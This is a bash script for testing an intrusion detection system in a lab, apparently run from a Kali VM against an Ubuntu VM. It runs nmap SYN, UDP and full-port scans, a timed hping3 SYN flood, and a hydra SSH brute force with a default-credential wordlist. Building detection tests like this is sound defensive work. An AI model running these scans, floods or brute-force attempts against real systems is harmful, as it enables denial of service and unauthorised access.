#!/usr/bin/env bash
# kali_attacks.sh — Attack simulation sequence for Phase 4 testing.
# Run from the Kali VM against the Ubuntu IDS VM.
#
# Usage:
#   chmod +x kali_attacks.sh
#   sudo bash kali_attacks.sh 192.168.1.92
#
# The script runs attacks in stages with pauses so you can observe
# per-attack detection in the IDS alert log.

set -e

TARGET="${1:-192.168.252.20}"
KALI_IP=$(ip route get "$TARGET" | awk '{print $7; exit}')

echo "======================================================="
echo " Kali Attack Simulation — Phase 4"
echo " Target (Ubuntu IDS): $TARGET"
echo " Source (Kali):       $KALI_IP"
echo "======================================================="
echo ""

# ── Stage 1: Reconnaissance — nmap SYN scan (stealth) ────────────────────────
echo "[Stage 1] SYN scan (nmap -sS) — port 1-1024..."
sudo nmap -sS -p 1-1024 --open -T4 "$TARGET" -oN /tmp/nmap_syn.txt
echo "  Done. Results → /tmp/nmap_syn.txt"
sleep 5

# ── Stage 2: Aggressive scan (OS + version detection) ────────────────────────
echo "[Stage 2] Aggressive scan (nmap -A)..."
sudo nmap -A -T4 "$TARGET" -oN /tmp/nmap_aggressive.txt 2>/dev/null || true
echo "  Done. Results → /tmp/nmap_aggressive.txt"
sleep 5

# ── Stage 3: UDP scan (triggers flow-level anomalies) ────────────────────────
echo "[Stage 3] UDP scan top-100 ports (nmap -sU)..."
sudo nmap -sU --top-ports 100 -T4 "$TARGET" -oN /tmp/nmap_udp.txt 2>/dev/null || true
echo "  Done. Results → /tmp/nmap_udp.txt"
sleep 5

# ── Stage 4: SYN flood (DoS — short burst, triggers Layer 1 + Layer 2) ───────
echo "[Stage 4] SYN flood on port 80 via hping3 (10 seconds)..."
if command -v hping3 &>/dev/null; then
    sudo timeout 10 hping3 -S -p 80 --flood "$TARGET" 2>/dev/null || true
    echo "  Done."
else
    echo "  [skip] hping3 not installed. Run: sudo apt install hping3"
fi
sleep 5

# ── Stage 5: SSH brute force (triggers Layer 3 session anomaly) ──────────────
echo "[Stage 5] SSH brute force via hydra (20 attempts)..."
if command -v hydra &>/dev/null; then
    # Uses a tiny wordlist — the goal is to generate anomalous session counts,
    # not to actually crack the password.
    cat > /tmp/users.txt <<'EOF'
root
admin
ubuntu
user
EOF
    cat > /tmp/pass.txt <<'EOF'
password
123456
admin
root
toor
letmein
EOF
    hydra -L /tmp/users.txt -P /tmp/pass.txt \
        -t 4 -f -o /tmp/hydra_ssh.txt \
        ssh://"$TARGET" 2>/dev/null || true
    echo "  Done. Results → /tmp/hydra_ssh.txt"
else
    echo "  [skip] hydra not installed. Run: sudo apt install hydra"
fi
sleep 5

# ── Stage 6: Port sweep (triggers ct_dst_sport_ltm spike) ────────────────────
echo "[Stage 6] Port sweep via nmap (all TCP ports, fast)..."
sudo nmap -sS -p- --min-rate 5000 -T5 "$TARGET" -oN /tmp/nmap_full.txt 2>/dev/null || true
echo "  Done. Results → /tmp/nmap_full.txt"

echo ""
echo "======================================================="
echo " Attack simulation complete."
echo " Check IDS alerts on Ubuntu:"
echo "   tail -f /var/log/multilayer_ids/alerts.jsonl"
echo " Check Suricata baseline:"
echo "   sudo tail -f /var/log/suricata/fast.log"
echo "======================================================="
